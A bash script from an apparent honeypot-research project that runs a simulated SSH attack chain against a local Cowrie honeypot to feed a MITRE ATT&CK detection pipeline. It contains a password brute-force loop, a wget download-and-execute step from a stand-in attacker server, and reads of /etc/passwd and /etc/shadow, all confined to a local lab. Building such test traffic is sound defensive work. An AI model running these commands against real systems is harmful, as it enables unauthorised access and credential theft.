#!/bin/bash
# =============================================================================
# CyberSentinel AI — attack.sh
# Realistic multi-phase attack simulation against Cowrie SSH honeypot
#
# SIH26153 context:
#   This script simulates a real-world attacker kill chain against the Cowrie
#   honeypot running on port 2222. It generates REAL network traffic at both
#   the application layer (SSH commands recorded by Cowrie) AND the packet
#   layer (real TCP packets captured live via scapy_feature_extractor.py).
#
# What this is NOT:
#   - Not an attack against any real system
#   - Target is 127.0.0.1:2222 — Cowrie honeypot running locally in Docker
#   - Payload server is a local Python HTTP server serving a harmless echo script
#   - All activity stays inside the local Docker bridge network
#
# MITRE ATT&CK techniques triggered:
#   T1110  — Brute Force            (Phase 2: credential stuffing, measured not assumed)
#   T1082  — System Info Discovery  (Phase 1: uname -a, cat /etc/issue)
#   T1087  — Account Discovery      (Phase 1: whoami, id, cat /etc/passwd)
#   T1105  — Ingress Tool Transfer  (Phase 3: wget payload from local HTTP server)
#   T1204  — User Execution         (Phase 3: chmod +x + execute payload)
#   T1049  — Network Connections    (Phase 4: netstat/ss)
#   T1057  — Process Discovery      (Phase 4: ps aux)
#
# Usage:
#   ./attack.sh               — full simulation (all 4 phases + packet capture)
#   ./attack.sh --no-brute    — skip brute force phase (faster, for quick tests)
#   ./attack.sh --no-capture  — skip live packet capture (app-layer only)
#   ./attack.sh --phase 1     — run only Phase 1 (reconnaissance)
#   ./attack.sh --quiet       — suppress per-command output
#
# Overrides (env vars, optional):
#   PAYLOAD_SERVER_IP_OVERRIDE=<ip>    force the payload server's advertised IP
#   CAPTURE_IFACE_OVERRIDE=<iface>     force the packet-capture interface
#
# Prerequisites:
#   sudo apt install -y sshpass tcpdump
#   docker-compose up -d && sleep 15   (Cowrie must be running first)
#   scapy_feature_extractor.py present in this directory (for packet capture)
# =============================================================================

set -uo pipefail
# NOTE: 'set -e' was removed on purpose. The old script used it together with
# an invalid ${#USERS[@]:-0} substitution in the summary block, which caused
# the ENTIRE script — including the whole Phase 4 summary — to die silently
# partway through (see the "bad substitution" crash). Every risky command
# below is now checked explicitly instead of relying on -e to fail loud.

# ── Configuration ─────────────────────────────────────────────────────────────
HONEYPOT_IP="127.0.0.1"
HONEYPOT_PORT="2222"
PAYLOAD_SERVER_PORT="8000"
PAYLOAD_FILE="payload.sh"
LOG_FILE="attacks.log"
TIMESTAMP=$(date '+%Y-%m-%d %H:%M:%S')
PCAP_FILE="honeypot_capture_$(date +%Y%m%d_%H%M%S).pcap"

# Credential sets (declared globally — the old script defined USERS/PASSWORDS
# *inside* the Phase 2 block, so referencing them later in the summary crashed
# whenever Phase 2 was skipped or the script reached the end. Now global.)
USERS=("root" "admin" "test" "oracle" "mysql" "ubuntu" "pi" "user")
PASSWORDS=("password123" "admin123" "123456" "root" "toor" "pass" "letmein" "qwerty")
USERS_COUNT=${#USERS[@]}

# SSH options — disable host key checking (honeypot rotates keys)
SSH_OPTS="-p ${HONEYPOT_PORT} \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o PasswordAuthentication=yes \
  -o PubkeyAuthentication=no \
  -o BatchMode=no \
  -o ConnectTimeout=5 \
  -o LogLevel=ERROR"

# Argument parsing
SKIP_BRUTE=0
SKIP_CAPTURE=0
QUIET=0
ONLY_PHASE=""
for arg in "$@"; do
  case $arg in
    --no-brute)   SKIP_BRUTE=1 ;;
    --no-capture) SKIP_CAPTURE=1 ;;
    --quiet)      QUIET=1 ;;
    --phase)      shift; ONLY_PHASE="$1" ;;
  esac
done

# ── Helpers ───────────────────────────────────────────────────────────────────
log() {
  echo "[$(date '+%H:%M:%S')] $*" | tee -a "$LOG_FILE"
}

log_phase() {
  echo ""
  echo "┌──────────────────────────────────────────────────────────┐"
  printf  "│  %-56s│\n" "$*"
  echo "└──────────────────────────────────────────────────────────┘"
}

ssh_cmd() {
  local user="$1"
  local pass="$2"
  local cmds="$3"
  sshpass -p "$pass" ssh $SSH_OPTS "${user}@${HONEYPOT_IP}" \
    bash -s <<< "$cmds" 2>/dev/null
}

check_dependencies() {
  local missing=0
  for cmd in sshpass ssh; do
    if ! command -v "$cmd" &>/dev/null; then
      echo "[!] Missing dependency: $cmd"
      echo "    Install: sudo apt install -y $cmd"
      missing=1
    fi
  done
  if [ $missing -eq 1 ]; then
    exit 1
  fi
}

check_honeypot() {
  log "Checking Cowrie honeypot on ${HONEYPOT_IP}:${HONEYPOT_PORT}..."
  if ! nc -z -w3 "$HONEYPOT_IP" "$HONEYPOT_PORT" 2>/dev/null; then
    echo "[!] Cowrie not reachable at ${HONEYPOT_IP}:${HONEYPOT_PORT}"
    echo "    Run: docker-compose up -d && sleep 15"
    exit 1
  fi
  log "Cowrie is UP and accepting connections ✓"
}

# =============================================================================
# ANSWERS Q1 — "Is this real traffic or just SSH commands?"
#
# The app-layer commands (whoami, wget, etc.) are recorded by Cowrie itself.
# That alone only proves *application-layer* activity. To prove real traffic
# exists at the *packet* layer too, this script now drives
# scapy_feature_extractor.py automatically, sniffing real TCP packets on the
# Docker bridge that carries traffic to the honeypot, for the full duration
# of the run. Output: honeypot_capture_<timestamp>.pcap — openable in
# Wireshark, and directly consumable by your Phase-2 feature pipeline.
# =============================================================================
detect_cowrie_container() {
  docker ps --format '{{.Names}}' 2>/dev/null | grep -i cowrie | head -n1
}

detect_cowrie_network_id() {
  local container
  container=$(detect_cowrie_container)
  [ -z "$container" ] && return 1
  docker inspect "$container" \
    --format '{{range $k, $v := .NetworkSettings.Networks}}{{$v.NetworkID}}{{end}}' 2>/dev/null
}

detect_capture_interface() {
  # Ask Docker which network the Cowrie container is actually on, then map
  # that to its host-side bridge name (Docker names it "br-" + first 12
  # chars of the network ID — this is exact, not a guess). Falls back to
  # scanning for any custom bridge only if the container can't be found,
  # which matters when the host has more than one docker-compose network
  # and a naive "last br- interface" pick grabs the wrong one.
  local net_id iface
  net_id=$(detect_cowrie_network_id)
  if [ -n "$net_id" ]; then
    iface="br-${net_id:0:12}"
    if ip link show "$iface" &>/dev/null; then
      echo "$iface"
      return
    fi
  fi
  iface=$(ip -o link show 2>/dev/null | awk -F': ' '/br-/{print $2}' | tail -n1)
  if [ -z "$iface" ]; then
    iface="docker0"
  fi
  echo "$iface"
}

start_packet_capture() {
  CAPTURE_PID=0
  if [ "$SKIP_CAPTURE" -eq 1 ]; then
    log "Packet capture skipped (--no-capture) — app-layer logs only"
    return
  fi
  if [ ! -f "scapy_feature_extractor.py" ]; then
    log "[!] scapy_feature_extractor.py not found in $(pwd) — skipping automated packet capture"
    log "    Run it manually in another terminal instead:"
    log "      sudo python3 scapy_feature_extractor.py --capture --iface <bridge> --port ${HONEYPOT_PORT}"
    return
  fi

  CAPTURE_IFACE="${CAPTURE_IFACE_OVERRIDE:-$(detect_capture_interface)}"
  log "Starting live packet capture on interface ${CAPTURE_IFACE} (tcp port ${HONEYPOT_PORT})"
  log "  → resolved via docker inspect on the Cowrie container's network, not guessed"
  log "  → proves attack traffic at the packet layer, not just inside Cowrie's app log"

  # Cache sudo credentials up front so the backgrounded capture doesn't hang
  # waiting on an interactive password prompt.
  sudo -v
  if [ $? -ne 0 ]; then
    log "[!] Could not obtain sudo — packet capture skipped"
    return
  fi

  sudo python3 scapy_feature_extractor.py --capture \
    --iface "$CAPTURE_IFACE" --port "$HONEYPOT_PORT" \
    > /tmp/cs_capture.log 2>&1 &
  CAPTURE_PID=$!
  sleep 2

  if kill -0 "$CAPTURE_PID" 2>/dev/null; then
    log "Packet capture running (PID ${CAPTURE_PID}) ✓ → ${PCAP_FILE}"
  else
    log "[!] Packet capture failed to start — /tmp/cs_capture.log contents:"
    if [ -f /tmp/cs_capture.log ]; then
      while IFS= read -r line; do log "    ${line}"; done < <(tail -n 15 /tmp/cs_capture.log)
    else
      log "    (log file does not exist)"
    fi
    CAPTURE_PID=0
  fi
}

stop_packet_capture() {
  if [ "${CAPTURE_PID:-0}" -gt 0 ]; then
    sudo kill -INT "$CAPTURE_PID" 2>/dev/null
    sleep 2
    # scapy_feature_extractor.py may write to its own default filename
    # rather than the one we asked for via --out (if it even supports that
    # flag) — check the name we requested first, then common fallbacks,
    # before declaring failure.
    local found=""
    for f in "$PCAP_FILE" "honeypot_capture.pcap"; do
      if [ -f "$f" ]; then found="$f"; break; fi
    done
    if [ -z "$found" ]; then
      found=$(ls -t honeypot_capture*.pcap 2>/dev/null | head -n1)
    fi
    if [ -n "$found" ]; then
      local size
      size=$(du -h "$found" 2>/dev/null | cut -f1)
      log "Packet capture stopped — ${found} (${size:-unknown size})"
    else
      log "Packet capture stopped — no pcap file found"
      if [ -f /tmp/cs_capture.log ]; then
        log "  Contents of /tmp/cs_capture.log:"
        while IFS= read -r line; do log "    ${line}"; done < <(tail -n 15 /tmp/cs_capture.log)
      else
        log "  /tmp/cs_capture.log does not exist either — capture likely never started"
      fi
    fi
  fi
}

# =============================================================================
# ANSWERS Q2 — "Why is the payload server at 10.0.2.2:8000 — is that a real
# attacker?"
#
# It's not, and it never claimed to be — it's a local Python HTTP server
# playing the role of attacker infrastructure, same idea as Metasploit's
# LHOST in a lab exercise. The bug in the OLD script was that 10.0.2.2 is a
# VirtualBox NAT convention that only applies when Cowrie runs directly on a
# VM with that specific network mode. Your Cowrie runs inside a Docker
# container instead, so the container can only reach the host via the Docker
# bridge gateway (e.g. 172.18.0.1) — not 10.0.2.2. That's exactly why Phase 3
# was failing with "unable to resolve host address '10.0.2.2'".
#
# Fix: auto-detect the real bridge gateway IP, and verify reachability FROM
# INSIDE the honeypot session before running the full Phase 3 loop, instead
# of discovering the failure 10 times over.
# =============================================================================
detect_payload_server_ip() {
  # PRIMARY method: ask the Cowrie container's own kernel what its default
  # gateway actually is, by reading /proc/net/route from inside the
  # container via `docker exec`. This is the exact route the container will
  # use for any outbound request — not a guess based on scanning host-side
  # bridges, which failed twice in a row on this host (multiple docker
  # networks made that approach unreliable).
  local container route_line gw_hex ip
  container=$(detect_cowrie_container)
  if [ -n "$container" ]; then
    route_line=$(docker exec "$container" cat /proc/net/route 2>/dev/null | awk '$2=="00000000"{print;exit}')
    if [ -n "$route_line" ]; then
      gw_hex=$(echo "$route_line" | awk '{print $3}')
      if [ -n "$gw_hex" ] && [ "${#gw_hex}" -eq 8 ]; then
        ip=$(( 16#${gw_hex:6:2} )).$(( 16#${gw_hex:4:2} )).$(( 16#${gw_hex:2:2} )).$(( 16#${gw_hex:0:2} ))
        echo "$ip"
        return
      fi
    fi
  fi

  # Fallback tier 2: docker inspect gateway on the container's network
  local net_id
  net_id=$(detect_cowrie_network_id)
  if [ -n "$net_id" ]; then
    ip=$(docker network inspect "$net_id" \
      --format '{{range .IPAM.Config}}{{.Gateway}}{{end}}' 2>/dev/null)
    [ -n "$ip" ] && { echo "$ip"; return; }
  fi

  # Fallback tier 3: scan host bridges (least reliable — kept for last resort)
  ip=$(ip -o -4 addr show 2>/dev/null | awk '/br-/{print $4}' | cut -d/ -f1 | head -n1)
  if [ -z "$ip" ]; then
    ip=$(ip -o -4 addr show docker0 2>/dev/null | awk '{print $4}' | cut -d/ -f1)
  fi
  echo "${ip:-10.0.2.2}"
}

setup_payload_server() {
  local cowrie_container net_id detected_ip route_line
  cowrie_container=$(detect_cowrie_container)
  net_id=""
  detected_ip=""

  if [ -z "$cowrie_container" ]; then
    log "[debug] No running container name matched 'cowrie' via 'docker ps' — is docker on PATH / do you have permission to run it without sudo?"
  else
    log "[debug] Cowrie container detected: ${cowrie_container}"
    route_line=$(docker exec "$cowrie_container" cat /proc/net/route 2>/dev/null | awk '$2=="00000000"{print;exit}')
    if [ -n "$route_line" ]; then
      log "[debug] Container's own default route (/proc/net/route): ${route_line}"
    else
      log "[debug] 'docker exec ${cowrie_container} cat /proc/net/route' returned nothing — falling back to docker network inspect"
      net_id=$(detect_cowrie_network_id)
      [ -n "$net_id" ] && log "[debug] Cowrie container network ID: ${net_id}"
    fi
  fi

  PAYLOAD_SERVER_IP="${PAYLOAD_SERVER_IP_OVERRIDE:-$(detect_payload_server_ip)}"
  log "[debug] Final resolved payload IP before probing: ${PAYLOAD_SERVER_IP}"
  if [ -n "$cowrie_container" ] && [ -z "${PAYLOAD_SERVER_IP_OVERRIDE:-}" ]; then
    log "Payload server IP resolved to ${PAYLOAD_SERVER_IP} (Cowrie container's own default-route gateway — NOT a real attacker host). This will still be re-verified by a live probe before Phase 3 runs."
  else
    log "Payload server IP resolved to ${PAYLOAD_SERVER_IP} (FALLBACK detection, not container-verified — override with PAYLOAD_SERVER_IP_OVERRIDE if Phase 3 fails)"
  fi

  local payload_dir="/tmp/cs_payload"
  mkdir -p "$payload_dir"

  cat > "${payload_dir}/${PAYLOAD_FILE}" << 'PAYLOAD'
#!/bin/bash
# CyberSentinel AI — harmless test payload
# This file proves T1105 (Ingress Tool Transfer) and T1204 (User Execution)
# It performs no harmful action — it only identifies itself
echo "[payload] CyberSentinel test payload executed"
echo "[payload] hostname: $(hostname 2>/dev/null || echo 'cowrie-honeypot')"
echo "[payload] whoami:   $(whoami 2>/dev/null || echo 'root')"
echo "[payload] T1204 User Execution — confirmed"
PAYLOAD

  chmod +x "${payload_dir}/${PAYLOAD_FILE}"

  pkill -f "python3 -m http.server ${PAYLOAD_SERVER_PORT}" 2>/dev/null
  sleep 1

  (cd "$payload_dir" && python3 -m http.server "$PAYLOAD_SERVER_PORT" \
    --bind 0.0.0.0 > /tmp/payload_server.log 2>&1) &
  PAYLOAD_PID=$!

  sleep 2

  if kill -0 "$PAYLOAD_PID" 2>/dev/null; then
    log "Payload HTTP server started on 0.0.0.0:${PAYLOAD_SERVER_PORT} (PID ${PAYLOAD_PID}) ✓"
    log "Payload URL: http://${PAYLOAD_SERVER_IP}:${PAYLOAD_SERVER_PORT}/${PAYLOAD_FILE}"
  else
    log "[!] Payload server failed to start — Phase 3 will be skipped"
    PAYLOAD_PID=0
  fi
}

verify_payload_reachable() {
  # Tests reachability from INSIDE the honeypot's own shell session — the
  # only place that actually matters for Phase 3 — instead of assuming it.
  #
  # Rather than trusting a single guessed IP, this now collects every
  # plausible candidate (the Cowrie container's own network gateway if
  # docker inspect worked, PLUS every other br-/docker0 gateway visible on
  # the host) and tests each one for real from inside the session, keeping
  # whichever one actually answers. This sidesteps needing to get the
  # detection logic perfectly right on hosts with multiple docker networks.
  if [ "${PAYLOAD_PID:-0}" -eq 0 ]; then
    return 1
  fi

  local candidates=()
  [ -n "$PAYLOAD_SERVER_IP" ] && candidates+=("$PAYLOAD_SERVER_IP")
  while IFS= read -r ip; do
    [ -n "$ip" ] && candidates+=("$ip")
  done < <(ip -o -4 addr show 2>/dev/null | awk '/br-|docker0/{print $4}' | cut -d/ -f1)

  # de-duplicate while preserving order
  local seen="" unique=()
  for ip in "${candidates[@]}"; do
    case " $seen " in
      *" $ip "*) ;;
      *) unique+=("$ip"); seen="$seen $ip" ;;
    esac
  done

  log "Probing ${#unique[@]} candidate payload-server IP(s) from inside the honeypot session: ${unique[*]}"

  local ip result
  for ip in "${unique[@]}"; do
    result=$(ssh_cmd "root" "password123" "
wget -q --timeout=3 -O /dev/null http://${ip}:${PAYLOAD_SERVER_PORT}/${PAYLOAD_FILE} && echo CS_REACHABLE || echo CS_UNREACHABLE
exit
")
    if echo "$result" | grep -q "CS_REACHABLE"; then
      PAYLOAD_SERVER_IP="$ip"
      log "Payload server reachable from honeypot session ✓ at ${PAYLOAD_SERVER_IP} (confirmed by live probe, not just detection)"
      return 0
    fi
    log "  [x] ${ip} — unreachable"
  done

  log "[!] None of the ${#unique[@]} candidate IPs were reachable from inside the honeypot session"
  log "    Manual diagnosis: run these on the Kali host and compare —"
  log "      docker ps --format '{{.Names}}'"
  log "      docker inspect <cowrie-container> --format '{{json .NetworkSettings.Networks}}'"
  log "    Then:  PAYLOAD_SERVER_IP_OVERRIDE=<correct-ip> ./attack.sh"
  log "    Phase 3 will be SKIPPED this run rather than looping 10x on a known failure."
  return 1
}

cleanup_payload_server() {
  if [ "${PAYLOAD_PID:-0}" -gt 0 ]; then
    kill "$PAYLOAD_PID" 2>/dev/null
    log "Payload server stopped (PID ${PAYLOAD_PID})"
  fi
}

# ── Main ──────────────────────────────────────────────────────────────────────
trap 'cleanup_payload_server; stop_packet_capture' EXIT

log "================================================================"
log "  CyberSentinel AI — Attack Simulation"
log "  Target: Cowrie honeypot at ${HONEYPOT_IP}:${HONEYPOT_PORT}"
log "  Started: ${TIMESTAMP}"
log "================================================================"
log ""

check_dependencies
check_honeypot
start_packet_capture
setup_payload_server

# Track counters for end-of-run summary
RECON_SESSIONS=0
BRUTE_ATTEMPTS=0
FAILED_LOGINS=0
SUCCESS_LOGINS=0
DISTINCT_USERNAMES=0
EXEC_SESSIONS=0
PHASE3_RAN=0

# =============================================================================
# PHASE 1 — RECONNAISSANCE
# MITRE T1082: System Information Discovery
# MITRE T1087: Account Discovery
# =============================================================================
if [ -z "$ONLY_PHASE" ] || [ "$ONLY_PHASE" = "1" ]; then

log_phase "Phase 1: Reconnaissance  [T1082 · T1087]"
log "Running system enumeration commands (10 sessions)"
log "Triggers: T1082 (uname, /etc/issue) · T1087 (whoami, id, /etc/passwd)"

for i in {1..10}; do
  ssh_cmd "root" "password123" '
whoami
id
uname -a
cat /etc/issue 2>/dev/null || echo "no /etc/issue"
cat /etc/passwd
hostname
env
ls /home
ls /root 2>/dev/null || true
exit
' >/dev/null
  RECON_SESSIONS=$((RECON_SESSIONS + 1))
  [ "$QUIET" -eq 0 ] && printf "  [Recon] Session %2d/10 complete\r" "$i"
  sleep 0.3
done
echo ""
log "Phase 1 complete: ${RECON_SESSIONS} reconnaissance sessions ✓"
log "  → T1082 (System Info Discovery) triggered: uname -a, /etc/issue"
log "  → T1087 (Account Discovery) triggered: whoami, id, cat /etc/passwd"

fi # end Phase 1

# =============================================================================
# PHASE 2 — BRUTE FORCE
# MITRE T1110: Brute Force
#
# ANSWERS Q3 — "How do you know T1110 is actually brute force and not just
# failed logins?"
#
# The OLD script only counted total attempts and printed the *configured*
# username count — it never checked whether individual logins actually
# failed. This version checks the real exit code of every single SSH
# attempt, tallies real failures vs. real successes, counts distinct
# usernames actually used, and prints a validation block comparing those
# measured numbers against ttp_extract.py's own T1110 threshold (≥5 failed
# logins AND ≥3 distinct usernames) — so the claim is checkable, not assumed.
# =============================================================================
if [ "$SKIP_BRUTE" -eq 0 ] && ([ -z "$ONLY_PHASE" ] || [ "$ONLY_PHASE" = "2" ]); then

log_phase "Phase 2: Brute Force  [T1110]"
log "Attempting credential stuffing: ${USERS_COUNT} usernames × ${#PASSWORDS[@]} passwords = $((USERS_COUNT * ${#PASSWORDS[@]})) attempts"
log "Triggers: T1110 (Brute Force) — threshold: 5+ failures, 3+ distinct usernames"

declare -A USER_ATTEMPT_COUNT

for user in "${USERS[@]}"; do
  for pass in "${PASSWORDS[@]}"; do
    if sshpass -p "$pass" ssh $SSH_OPTS "${user}@${HONEYPOT_IP}" "exit" 2>/dev/null; then
      SUCCESS_LOGINS=$((SUCCESS_LOGINS + 1))
    else
      FAILED_LOGINS=$((FAILED_LOGINS + 1))
    fi
    USER_ATTEMPT_COUNT["$user"]=$(( ${USER_ATTEMPT_COUNT["$user"]:-0} + 1 ))
    BRUTE_ATTEMPTS=$((BRUTE_ATTEMPTS + 1))
    [ "$QUIET" -eq 0 ] && printf "  [Brute] Attempt %3d — %s:%s\r" "$BRUTE_ATTEMPTS" "$user" "$pass"
    sleep 0.1
  done
done
echo ""

DISTINCT_USERNAMES=${#USER_ATTEMPT_COUNT[@]}

log "Phase 2 complete: ${BRUTE_ATTEMPTS} attempts across ${DISTINCT_USERNAMES} usernames ✓"
log ""
log "── T1110 Brute Force Validation ──────────────────────────────"
# ttp_extract.py's real T1110 rule counts NO-COMMAND probe sessions from one
# source IP (>=5), each with a distinct username (>=3 distinct) — NOT failed
# logins. Cowrie accepts most passwords, so "failed logins" was the wrong
# yardstick and wrongly predicted FAIL while the detector correctly flagged
# every session. Every attempt here is a bare `ssh … "exit"` = one no-command
# session, so BRUTE_ATTEMPTS is what the real rule sees.
log "  Total attempts:        ${BRUTE_ATTEMPTS}"
log "  No-command sessions:   ${BRUTE_ATTEMPTS}   (each attempt is an 'exit'-only session — ttp_extract.py threshold: ≥5)"
log "  Distinct usernames:    ${DISTINCT_USERNAMES}   (ttp_extract.py threshold: ≥3)"
log "  (failed=${FAILED_LOGINS}, success=${SUCCESS_LOGINS} — reference only; NOT what the real detector uses)"
if [ "$BRUTE_ATTEMPTS" -ge 5 ] && [ "$DISTINCT_USERNAMES" -ge 3 ]; then
  log "  Result: PASS — ttp_extract.py WILL flag these sessions as T1110"
  log "  (matches the real cross-session correlation rule: ≥5 no-command sessions, ≥3 usernames)"
else
  log "  Result: FAIL — fewer than 5 no-command sessions or fewer than 3 usernames;"
  log "  ttp_extract.py will NOT flag T1110. Increase USERS/PASSWORDS to cross the threshold."
fi
log "────────────────────────────────────────────────────────────"

fi # end Phase 2

# =============================================================================
# PHASE 3 — INGRESS TOOL TRANSFER + EXECUTION
# MITRE T1105: Ingress Tool Transfer  (wget from HTTP server)
# MITRE T1204: User Execution         (chmod +x + execute payload)
# =============================================================================
if [ -z "$ONLY_PHASE" ] || [ "$ONLY_PHASE" = "3" ]; then

log_phase "Phase 3: Tool Transfer + Execution  [T1105 · T1204]"

if verify_payload_reachable; then
  PHASE3_RAN=1
  log "Downloading and executing payload from ${PAYLOAD_SERVER_IP}:${PAYLOAD_SERVER_PORT}"
  log "Triggers: T1105 (wget download) · T1204 (chmod +x + execute)"
  log "Note: payload is a harmless echo script — no real malicious action"

  for i in {1..10}; do
    ssh_cmd "root" "password123" "
wget -q http://${PAYLOAD_SERVER_IP}:${PAYLOAD_SERVER_PORT}/${PAYLOAD_FILE} -O /tmp/${PAYLOAD_FILE}
chmod +x /tmp/${PAYLOAD_FILE}
/tmp/${PAYLOAD_FILE}
rm -f /tmp/${PAYLOAD_FILE}
exit
" >/dev/null
    EXEC_SESSIONS=$((EXEC_SESSIONS + 1))
    [ "$QUIET" -eq 0 ] && printf "  [Exec] Session %2d/10 complete\r" "$i"
    sleep 0.3
  done
  echo ""
  log "Phase 3 complete: ${EXEC_SESSIONS} execution sessions ✓"
  log "  → T1105 (Ingress Tool Transfer) triggered: wget download"
  log "  → T1204 (User Execution) triggered: chmod +x + execute"
else
  log "Phase 3 SKIPPED — payload server unreachable from honeypot session"
fi

fi # end Phase 3

# =============================================================================
# PHASE 4 — LATERAL MOVEMENT (extended recon post-compromise)
# MITRE T1082, T1049, T1057
# =============================================================================
if [ -z "$ONLY_PHASE" ] || [ "$ONLY_PHASE" = "4" ]; then

log_phase "Phase 4: Post-Compromise Enumeration  [T1082 · T1049 · T1057]"
log "Simulating attacker behaviour after initial access"

for i in {1..5}; do
  ssh_cmd "root" "password123" '
ps aux
netstat -an 2>/dev/null || ss -an
ifconfig 2>/dev/null || ip addr
cat /etc/shadow 2>/dev/null || echo "shadow not readable"
find / -name "*.conf" -maxdepth 3 2>/dev/null | head -10
exit
' >/dev/null
  [ "$QUIET" -eq 0 ] && printf "  [Post] Session %2d/5 complete\r" "$i"
  sleep 0.3
done
echo ""
log "Phase 4 complete: 5 post-compromise sessions ✓"
log "  → T1049 (Network Connections) triggered: netstat/ss"
log "  → T1057 (Process Discovery) triggered: ps aux"

fi # end Phase 4

# =============================================================================
# END OF SIMULATION — SUMMARY
# =============================================================================
echo ""
echo "================================================================"
echo "  ATTACK SIMULATION COMPLETE"
echo "================================================================"
echo ""
printf "  %-30s %s\n" "Reconnaissance sessions:"  "${RECON_SESSIONS}"
printf "  %-30s %s\n" "Brute force attempts:"     "${BRUTE_ATTEMPTS}"
printf "  %-30s %s\n" "  – failed logins:"        "${FAILED_LOGINS}"
printf "  %-30s %s\n" "  – successful logins:"    "${SUCCESS_LOGINS}"
printf "  %-30s %s\n" "  – distinct usernames:"   "${DISTINCT_USERNAMES}"
printf "  %-30s %s\n" "Execution sessions:"        "${EXEC_SESSIONS}"
if [ "${CAPTURE_PID:-0}" -gt 0 ]; then
  printf "  %-30s %s\n" "Packet capture:" "${PCAP_FILE}"
fi
echo ""
echo "  MITRE ATT&CK techniques generated:"
echo "    T1110  Brute Force               ← ${BRUTE_ATTEMPTS} attempts (${FAILED_LOGINS} failed), ${DISTINCT_USERNAMES} usernames"
echo "    T1082  System Info Discovery     ← uname, /etc/issue, hostname"
echo "    T1087  Account Discovery         ← whoami, id, /etc/passwd"
if [ "$PHASE3_RAN" -eq 1 ]; then
  echo "    T1105  Ingress Tool Transfer     ← wget from ${PAYLOAD_SERVER_IP}:${PAYLOAD_SERVER_PORT}"
  echo "    T1204  User Execution            ← chmod +x + execute payload"
else
  echo "    T1105/T1204                      ← SKIPPED this run (payload server unreachable)"
fi
echo "    T1049  Network Connections       ← netstat/ss"
echo "    T1057  Process Discovery         ← ps aux"
echo ""
echo "  Next steps:"
echo "    docker cp honeypot-cowrie-1:/cowrie/cowrie-git/var/log/cowrie/cowrie.json \\"
echo "        cowrie-raw.json"
echo "    ./run_pipeline.sh"
echo ""
echo "================================================================"

{
  echo ""
  echo "=== Simulation Summary: $(date '+%Y-%m-%d %H:%M:%S') ==="
  echo "Recon sessions:      ${RECON_SESSIONS}"
  echo "Brute attempts:      ${BRUTE_ATTEMPTS} (failed: ${FAILED_LOGINS}, success: ${SUCCESS_LOGINS}, usernames: ${DISTINCT_USERNAMES})"
  echo "Exec sessions:       ${EXEC_SESSIONS}"
  echo "Packet capture:      ${PCAP_FILE:-none}"
} >> "$LOG_FILE"
